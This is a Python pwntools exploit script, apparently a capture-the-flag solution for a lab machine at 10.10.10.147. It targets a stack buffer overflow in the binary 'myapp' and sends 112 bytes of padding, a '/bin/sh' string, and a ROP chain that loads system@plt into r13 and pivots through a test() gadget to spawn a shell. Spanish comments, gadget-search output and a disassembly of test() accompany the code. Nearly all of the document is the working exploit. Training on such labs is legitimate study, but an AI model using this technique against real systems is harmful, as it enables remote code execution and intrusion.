#!/usr/bin/python3

from pwn import *

#context(terminal=['tmux','new-window'])
#context(os='linux', arch='amd64')

#p = gdb.debug("./myapp", "b *main")
p = remote("10.10.10.147", 1337)
#p.recvuntil("What do you want me to echo back?")

'''
Para llegar al $rsp se necesitan 120 caracteres
Queremos colocar el payload en la cima de la pila, por lo tanto junk=120. size(bin_sh)=112
'''

junk=b"A"*112
bin_sh=b"/bin/sh\x00" 

'''
ropper -f myapp --search "pop r13"
    [INFO] File: myapp
    0x0000000000401206: pop r13; pop r14; pop r15; ret;
    
    system_plt <-- r13
    null <-- r14
    null <-- r15
    test <-- ret


'''

pop_r13 = p64(0x401206)
null = p64(0x0)

'''
objdump -D myapp | grep system
    0000000000401040 <system@plt>:
'''

system_plt = p64(0x401040)

'''
objdump -D myapp | grep test
    0000000000401152 <test>
'''
test = p64(0x401152)


'''
                             **************************************************************
                             *                                                            *
                             *  FUNCTION                                                  *
                             **************************************************************
                             undefined test()
             undefined         AL:1           <RETURN>
                             test                                            XREF[3]:     Entry Point(*), 00402060, 
                                                                                          00402108(*)  
        00401152 55              PUSH       RBP
        00401153 48 89 e5        MOV        RBP,RSP
        00401156 48 89 e7        MOV        RDI,RSP --> RDI = /bin/sh
        00401159 41 ff e5        JMP        R13
        0040115c 90              ??         90h
        0040115d 5d              ??         5Dh    ]
        0040115e c3              ??         C3h
'''


payload = junk + bin_sh + pop_r13 + system_plt + null + null + test

p.sendline(payload)
p.interactive()

